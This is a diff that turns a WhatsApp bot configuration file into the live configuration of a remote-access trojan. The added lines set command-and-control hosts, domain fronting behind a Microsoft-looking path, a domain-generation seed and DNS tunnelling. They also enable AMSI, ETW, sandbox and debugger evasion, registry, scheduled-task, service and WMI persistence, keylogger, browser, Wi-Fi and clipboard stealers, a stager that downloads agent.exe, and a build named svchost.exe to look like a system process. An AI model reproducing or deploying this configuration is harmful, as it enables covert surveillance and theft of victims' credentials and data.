@@ -1,14 +1,145 @@
-// The Bot name and Owner number Number comes here 
-// Base Bot by OmegaTech
-// Contact: https://wa.me/23279729810 (OmegaTech)
-
 {
-  "config": {
-    "name": "BaseBot",
-    "ownerJid": [
-      "23279729810@s.whatsapp.net",
-      "23279729810@s.whatsapp.net"
+  "c2_host": "garden-helper.fi",
+  "c2_port": 443,
+  "c2_protocol": "https",
+  "encryption_key": "6HbuOBOv2vml6cyXyReg8isgBvwNns335VoKatIEFfuak0tTirm3XlnnPZFsnWrC",
+  "universal_c2": {
+    "enabled": false,
+    "channels": [
+      {
+        "type": "https_fronting",
+        "host": "cdn.cloudflare.net",
+        "actual_host": "api.microsoft.com",
+        "port": 443,
+        "path": "/update/check",
+        "priority": 1
+      },
+      {
+        "type": "https_direct",
+        "host": "DGA_GENERATED",
+        "port": 443,
+        "path": "/api/v1/beacon",
+        "priority": 2
+      },
+      {
+        "type": "dns_tunnel",
+        "domain": "DGA_GENERATED",
+        "nameserver": "8.8.8.8",
+        "query_type": "TXT",
+        "priority": 3
+      }
     ],
-    "ownerLid": [""]
+    "max_fails": 5,
+    "rotate_on_fail": true
+  },
+  "dga": {
+    "seed": "aether_universal_class_project_retro",
+    "word_list": [
+      "cdn",
+      "api",
+      "update",
+      "service",
+      "cloud",
+      "storage",
+      "content",
+      "delivery"
+    ],
+    "tlds": [
+      ".com",
+      ".net",
+      ".org",
+      ".info",
+      ".io"
+    ],
+    "rotation_interval": 3600,
+    "pregen_count": 10
+  },
+  "beacon": {
+    "interval": 30,
+    "jitter": 8,
+    "adaptive": true,
+    "deep_sleep_after_fails": 5,
+    "deep_sleep_duration": 3600
+  },
+  "evasion": {
+    "tls_fingerprinting": true,
+    "domain_fronting": true,
+    "dns_obfuscation": true,
+    "randomize_user_agent": true,
+    "jitter_beacon": true,
+    "enabled": [
+      "amsi_bypass",
+      "etw_bypass",
+      "sandbox_detection",
+      "vm_detection",
+      "debugger_detection",
+      "sleep_obfuscation"
+    ]
+  },
+  "persistence_methods": [
+    "registry",
+    "scheduled_task",
+    "service",
+    "wmi"
+  ],
+  "modules": {
+    "enable_keylogger": true,
+    "enable_screenshot": true,
+    "enable_webcam": false,
+    "enable_audio": false,
+    "enable_browser_stealer": true,
+    "enable_wifi_stealer": true,
+    "enable_clipboard": true,
+    "safe_mode": true,
+    "enabled": [
+      "keylogger",
+      "screenshot",
+      "webcam",
+      "audio",
+      "browser",
+      "wifi",
+      "clipboard"
+    ]
+  },
+  "ai": {
+    "enabled": true,
+    "learning_rate": 0.01,
+    "adapt_beacon_interval": true,
+    "evade_based_on_patterns": true
+  },
+  "c2": {
+    "primary_host": "192.168.1.201",
+    "primary_port": 5555
+  },
+  "agent": {
+    "persistence_methods": [
+      "registry",
+      "scheduled_task",
+      "service",
+      "wmi"
+    ]
+  },
+  "stager": {
+    "agent_url": "https://192.168.1.201/agent.exe",
+    "config_url": "https://192.168.1.201/config.json"
+  },
+  "whatsapp": {
+    "bot_url": "http://localhost:3000",
+    "auth_password": "Retro-263",
+    "authorized_users": [
+      "+263781564004"
+    ],
+    "features": {
+      "enable_command_history": true,
+      "enable_session_linking": true,
+      "enable_file_transfer": true,
+      "enable_batch_commands": true
+    }
+  },
+  "builder": {
+    "output_name": "svchost.exe",
+    "use_pyarmor": false,
+    "use_upx": false,
+    "icon_path": "E:\\Tools\\icon.png"
   }
 }
